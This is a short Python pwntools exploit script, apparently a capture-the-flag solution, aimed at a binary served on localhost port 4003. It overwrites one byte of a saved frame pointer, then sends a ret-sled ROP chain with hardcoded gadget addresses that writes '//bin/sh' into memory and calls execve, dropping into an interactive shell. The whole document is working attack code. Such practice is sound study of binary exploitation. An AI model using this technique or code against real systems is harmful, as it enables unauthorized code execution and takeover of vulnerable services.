from pwn import *

context.update(os = "linux", arch = "amd64")

# io = process("./main")
io = remote("127.0.0.1", 4003)

# gdb.attach(io, gdbscript = "")
# input("[ENTER]")

# We override one byte of the saved rbp of readUsername to make the stack frame of main() function smaller.
# Therefore, it is possible that the top of the [rbp-0xb0] buffer in main() frame falls into the top frame.
# This way, we can override the return address of readDescription after it calls memMove.
# (although this is not reliable and might need some tries to work).
# I used ret-sleds (chains of 'ret' ROP gadgets) to slightly increase the probability of success.

# overwriting saved rbp of readUsername
io.sendline(b"1")
io.send(b"A" * 0x10 + b"\0")
io.sendline(b"2")

# gadgets:
pop_rsi = 0x40ab23	# pop rsi ; ret
pop_rax = 0x431c77	# pop rax ; ret
pop_rdi = 0x401f3d	# pop rdi ; ret
pop_rdx_rbx = 0x463367	# pop rdx ; pop rbx ; ret
data_section = 0x4a7400	# an RW section in memory
syscall = 0x4011a2	# syscall
mem_write = 0x4342e1	# mov qword [rsi], rax ; ret
ret = 0x401911	# ret

rop = p64(pop_rax)
rop += b"//bin/sh"
rop += p64(pop_rsi)
rop += p64(data_section)
rop += p64(mem_write)
rop += p64(pop_rdi)
rop += p64(data_section)
rop += p64(pop_rax)
rop += p64(59)	# SYS_execve
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx_rbx)
rop += p64(0) * 2
rop += p64(syscall)
rop = p64(ret) * 2 + rop + p64(ret)
assert(len(rop) == 0x90)

io.send(rop)
io.sendline(b"ls")
io.interactive()
